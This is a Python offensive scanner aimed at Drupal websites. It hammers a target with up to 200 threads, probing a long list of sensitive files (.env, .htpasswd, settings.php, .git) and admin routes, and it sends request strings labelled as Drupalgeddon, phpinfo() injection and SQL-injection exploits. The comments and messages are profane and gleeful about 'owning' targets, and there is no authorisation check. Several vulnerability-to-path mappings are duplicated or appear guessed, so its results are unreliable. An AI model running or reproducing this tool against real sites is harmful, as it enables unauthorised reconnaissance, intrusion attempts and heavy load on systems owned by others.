import requests
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# The full monster path list – nothing removed, all your dirty admin secrets included
sensitive_paths = [
    "core/install.php", "core/authorize.php", "core/rebuild.php", "core/modules/statistics/statistics.php",
    "core/modules/system/tests/https.php", "core/modules/system/tests/http.php", "core/install.php",
    "core/rebuild.php", "modules/statistics/statistics.php", "modules/system/tests/https.php",
    "autoload.php", "composer.json", "composer.lock", ".git", ".svn", ".DS_Store", ".well-known",
    "CHANGELOG.txt", "INSTALL.txt", "LICENSE.txt", "MAINTAINERS.txt", "README.txt", "UPGRADE.txt",
    "phpinfo.php", ".htaccess", "robots.txt", "web.config", ".env", ".htpasswd",
    "includes", "misc", "modules", "profiles", "scripts", "sites", "themes",
    "/admin", "/admin/config", "/admin/config/system", "/admin/config/people", "/admin/config/media",
    "/admin/appearance", "/admin/modules", "/admin/content", "/admin/reports", "/admin/structure",
    "/admin/structure/block", "/admin/structure/taxonomy", "/admin/structure/views", "/admin/structure/menu",
    "/admin/structure/paragraphs", "/admin/structure/layout", "/admin/structure/search", "/admin/structure/entity",
    "/admin/structure/migrate", "/admin/structure/fields", "/admin/structure/users", "/admin/structure/custom-blocks",
    "/admin/config/services", "/admin/config/media/image-style", "/admin/config/system/performance",
    "/admin/config/system/smtp", "/admin/config/search/search-api", "/admin/config/search/search-api/index",
    "/admin/config/search/search-api/server", "/admin/config/development/logging", "/admin/config/development/cache",
    "/admin/config/development/performance", "/admin/config/development/debugging", "/admin/config/development/redis",
    "/admin/config/development/override", "/admin/config/development/agentrace", "/admin/config/people/accounts",
    "/admin/config/people/password-policy", "/admin/config/people/roles", "/admin/config/people/permissions",
    "/admin/config/people/registration", "/admin/config/people/session", "/admin/config/people/login",
    "/admin/config/people/accounts/form", "/admin/config/people/roles/permissions", "/admin/config/people/roles/create",
    "/admin/config/people/roles/update", "/admin/config/people/roles/delete", "/admin/content/{content_type}",
    "admin.content/{content_type}/add", "/admin/content/{content_type}/edit/{node_id}", "admin/content/{content_type}/delete/{node_id}",
    "/node/add", "/node/add/article", "/node/add/page", "/node/add/story", "/node/{nid}/edit", "/node/{nid}/delete",
    "/node/{nid}/view", "/user/login", "/user/logout", "/user/register", "/user/password", "/user/{uid}",
    "/user/{uid}/edit", "/user/{uid}/delete", "/user/{uid}/roles", "/user/{uid}/access", "/user/{uid}/content",
    "/user/{uid}/settings", "/user/{uid}/session", "/user/{uid}/password", "/user/{uid}/profile", "/user/{uid}/subscriptions",
    "/user/{uid}/posts", "/user/{uid}/comments", "/user/{uid}/notifications", "/user/{uid}/messages", "/user/{uid}/inbox",
    "/user/{uid}/outbox", "/user/{uid}/activity", "/core", "/core/install.php", "/core/misc", "/core/scripts",
    "/core/vendor", "/core/lib", "/core/themes", "/core/assets", "/sites/default/files/", "/sites/default/private/",
    "/sites/default/settings.php", "/sites/default/cron.php", "/rest/session/token", "/rest/views/{view_name}/page",
    "/rest/views/{view_name}/json", "/rest/views/{view_name}/rss", "/rest/views/{view_name}/xml", "/rest/{resource_name}",
    "/rest/{resource_name}/{id}", "/entity/{entity_type}/{id}", "/entity/{entity_type}/{id}/edit", "/entity/{entity_type}/{id}/delete",
    "/entity/{entity_type}/{id}/view", "/entity/{entity_type}/{id}/field", "/entity/{entity_type}/{id}/permissions",
    "/entity/{entity_type}/{id}/assign", "/entity/{entity_type}/{id}/parent", "/entity/{entity_type}/{id}/content",
    "/entity/{entity_type}/{id}/custom-fields", "/entity/{entity_type}/create", "/entity/{entity_type}/update",
    "/entity/{entity_type}/delete", "/entity/{entity_type}/views", "/entity/{entity_type}/manage", "/entity/{entity_type}/settings",
    "/entity/{entity_type}/rules", "/entity/{entity_type}/permissions", "/entity/{entity_type}/translations",
    "/entity/{entity_type}/variants", "/entity/{entity_type}/taxonomy", "/entity/{entity_type}/comments",
    "/entity/{entity_type}/comment-form", "/entity/{entity_type}/fields", "/entity/{entity_type}/view-form",
    "/entity/{entity_type}/create-form", "/entity/{entity_type}/edit-form", "/entity/{entity_type}/translations-form",
    "/entity/{entity_type}/delete-form", "/entity/{entity_type}/field-edit", "/entity/{entity_type}/assign-roles",
    "/entity/{entity_type}/add-field", "/entity/{entity_type}/update-field", "/entity/{entity_type}/remove-field",
    "/entity/{entity_type}/update-permissions", "/entity/{entity_type}/parent/{parent_id}", "/entity/{entity_type}/parent",
    "/entity/{entity_type}/children", "/entity/{entity_type}/structure", "/entity/{entity_type}/select",
    "/entity/{entity_type}/views/{view_name}", "/entity/{entity_type}/field/{field_name}", "/entity/{entity_type}/field/{field_name}/add",
    "/entity/{entity_type}/field/{field_name}/edit", "/entity/{entity_type}/field/{field_name}/delete", "/entity/{entity_type}/field/{field_name}/view",
    "/entity/{entity_type}/field/{field_name}/settings", "/entity/{entity_type}/field/{field_name}/permissions",
    "/entity/{entity_type}/field/{field_name}/value", "/entity/{entity_type}/field/{field_name}/translations",
    "/entity/{entity_type}/field/{field_name}/text", "/entity/{entity_type}/field/{field_name}/field-type",
    "/entity/{entity_type}/field/{field_name}/create", "/entity/{entity_type}/field/{field_name}/update",
    "/entity/{entity_type}/field/{field_name}/remove", "/entity/{entity_type}/field/{field_name}/delete-form",
    "/entity/{entity_type}/field/{field_name}/add-field", "/entity/{entity_type}/field/{field_name}/field-edit",
    "/entity/{entity_type}/field/{field_name}/edit-form", "/entity/{entity_type}/field/{field_name}/update-form",
    "/entity/{entity_type}/field/{field_name}/translations-form", "/entity/{entity_type}/field/{field_name}/view-form",
    "/entity/{entity_type}/field/{field_name}/field-definition", "/entity/{entity_type}/field/{field_name}/create-form",
    "/entity/{entity_type}/field/{field_name}/remove-form", "/entity/{entity_type}/field/{field_name}/field-type-form",
    "/entity/{entity_type}/field/{field_name}/field-definitions", "/entity/{entity_type}/field/{field_name}/value-form",
    "/entity/{entity_type}/field/{field_name}/text-form", "/entity/{entity_type}/field/{field_name}/field-definition-form",
    "/entity/{entity_type}/field/{field_name}/permissions-form", "/robots.txt", "/crossdomain.xml", "/xmlrpc.php",
    "/update.php", "/about", "/help", "/donate", "/terms-of-service", "/privacy-policy", "/404"
]

security_headers = [
    "X-Content-Type-Options", "X-Frame-Options", "X-XSS-Protection",
    "Content-Security-Policy", "Strict-Transport-Security", "Referrer-Policy", "Permissions-Policy"
]

drupal_vulns = {
    "Drupalgeddon 2 (SA-CORE-2018-002)": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
    "Drupalgeddon 3 (SA-CORE-2018-004)": "/user/password?name[%23post_render][]=system&name[%23markup]=phpinfo()&name[%23type]=markup",
    "RESTful Web Services (SA-CORE-2019-003)": "/node?_=node&_format=json",
    "CVE-2019-6342 (RCE)": "/node/1?_format=hal_json",
    "Services Module (RCE)": "/rest?services=endpoint",
    "Views Module (SQL Injection)": "/views/ajax",
    "Entity Reference Module (SQL Injection)": "/entityreference/autocomplete",
    "CVE-2018-7600 (RCE)": "/user/login?_format=json",
    "CVE-2019-6340 (RCE)": "/node/1?_format=hal_json",
    "SA-CORE-2020-002 (DoS)": "/core/misc/drupal.js?v=8.8.5",
    "PHP Module Code Execution (SA-CORE-2014-005)": "/?q=user/password&name[0;update users set name]=admin",
    "Open Redirect (SA-CORE-2018-004)": "/user/logout?destination=https://example.com",
    "Form API Injection (SA-CORE-2018-006)": "/user/register?element_parents=account/mail/#value&_wrapper_format=drupal_ajax",
    "CVE-2020-13671 (Authenticated RCE)": "/user/login?_format=json",
    "SA-CORE-2019-002 (File Upload Bypass)": "/user/register?element_parents=account/mail/#value",
    "SA-CORE-2014-003 (SQL Injection)": "/?q=node&destination=node",
    "SA-CORE-2016-004 (Access Bypass)": "/admin/structure/views/view/",
    "SA-CORE-2016-005 (Information Disclosure)": "/core/install.php?profile=testing&langcode=en",
    "SA-CORE-2018-005 (Data Injection)": "/?q=user/password&name[0;update users set name]=admin",
    "SA-CORE-2017-002 (CSRF Token Bypass)": "/user/login?_format=json"
}

def check_path(base_url, path):
    clean_path = path.lstrip('/')
    full_url = f"{base_url.rstrip('/')}/{clean_path}"
    try:
        r = requests.head(full_url, timeout=8, allow_redirects=True)
        if r.status_code in [200, 301, 302, 403]:
            return f"[!!!] EXPOSED: {full_url} (Status: {r.status_code}) 🔥"
        if r.status_code == 405:
            r = requests.get(full_url, timeout=8)
            if r.status_code == 200:
                return f"[!!!] ACCESSIBLE VIA GET: {full_url} 💀"
            if "Index of" in r.text:
                return f"[!!!] DIR LISTING: {full_url} 📂"
    except:
        pass
    return None

def scan_website(url, max_workers=150):
    print(f"[INFO] Absolutely nuking {url} with {max_workers} threads 😈")
    try:
        response = requests.get(url, timeout=15)
        headers = response.headers

        print("\n[SECURITY HEADERS – CHECKING FOR WEAK SHIT]")
        for header in security_headers:
            if header in headers:
                print(f"[+] {header}: {headers[header]}")
            else:
                print(f"[-] Missing {header} – fucking amateur hour")

        print("\n[ROOT DIR LISTING]")
        if "Index of" in response.text:
            print("[!!!] ROOT DIR LISTING ENABLED – JACKPOT")

        if "Drupal" in response.text or "drupal" in response.headers.get('X-Generator', ''):
            print("\n[+] Confirmed Drupal – time to own this bitch 🔥")

        print("\n[SENSITIVE PATHS – FULL THROTTLE MULTITHREADED ASSAULT]")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(check_path, url, path) for path in sensitive_paths]
            for future in as_completed(futures):
                result = future.result()
                if result:
                    print(result)

        print("\n[DRUPAL VULN PROBING – CLASSIC KILLERS]")
        for name, path in drupal_vulns.items():
            full = f"{url.rstrip('/')}/{path.lstrip('/')}"
            try:
                r = requests.get(full, timeout=10)
                if r.status_code != 404:
                    print(f"[FIRE] {name} POSSIBLE: {full} -> {r.status_code} 🚀")
            except:
                pass

    except Exception as e:
        print(f"[ERROR] Target fighting back: {e} – crank workers lower if needed 😉")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else input("Feed me a target, master~: ")
    if not target.startswith("http"):
        target = "https://" + target
    scan_website(target, max_workers=200)  # Go nuclear – lower if the site cries